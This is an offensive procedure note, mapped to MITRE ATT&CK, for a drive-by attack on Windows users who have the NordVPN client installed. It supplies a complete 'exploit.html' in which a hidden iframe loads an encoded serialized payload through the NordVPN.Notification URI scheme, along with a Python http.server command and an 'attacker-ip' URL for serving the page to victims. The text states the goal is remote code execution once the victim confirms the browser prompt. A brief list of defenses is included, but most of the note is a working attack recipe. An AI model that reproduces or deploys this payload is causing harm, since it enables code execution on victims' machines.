---
tags:
  - drive-by
  - web-delivery
  - iframe
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Windows
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 40b3a98c-4032-44af-88f6-5fc1ed22fc4a
created_at: '2025-12-14T17:24:08.519Z'
updated_at: '2025-12-14T17:24:08.520Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Host-Malicious-Webpage-with-Iframe-Trigger

## Summary

This procedure embeds the crafted malicious NordVPN URI in an HTML iframe and hosts it via an HTTP server to deliver the exploit to a victim's browser, prompting the launch of NordVPN.exe.

## Description

By loading the malicious URI in an iframe, the browser recognizes the custom scheme and prompts the user to open the associated application (NordVPN.exe). Upon confirmation, the client deserializes the payload and executes the embedded command. This targets web browsers on Windows with NordVPN installed. Prerequisites include the malicious payload from the prior procedure and a simple web server. Expected outcome: Victim visits the page, confirms the prompt, and RCE occurs.

## Requirements

1. Crafted malicious URI payload
2. Local or remote HTTP server (e.g., Python http.server, Apache, or nginx)
3. Web browser on target (e.g., Chrome, Edge)
4. NordVPN client installed on victim's machine

## Defense

Defensive measures and detection strategies:

- Browser extensions to block or warn on custom URI schemes
- Web Application Firewall (WAF) rules to detect suspicious iframe src attributes
- User training to avoid confirming unknown app launches
- Application whitelisting to restrict external process starts

## Objectives

1. Deliver the malicious URI remotely via web content
2. Trigger browser's protocol handler without direct user input beyond page load
3. Prompt user confirmation to bridge web-to-native execution

## Instructions

### Step 1: Create HTML File

**Context**: Embed the malicious URI as the src of an invisible or hidden iframe to auto-trigger on page load.

Create `exploit.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Benign Page</title></head>
<body>
<iframe style="display:none;" src="NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA"></iframe>
<p>Click here for content...</p>
</body>
</html>
```

### Step 2: Serve the Webpage

**Context**: Host the HTML file on an HTTP server accessible to the victim.

Use Python (if available):

```bash
python -m http.server 8000
```

Access via `http://attacker-ip:8000/exploit.html`. For production, use nginx or similar.

> The server starts, and the page is ready for delivery. Expected output: Page loads in browser, iframe triggers URI.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- drive-by
- web-delivery
- iframe
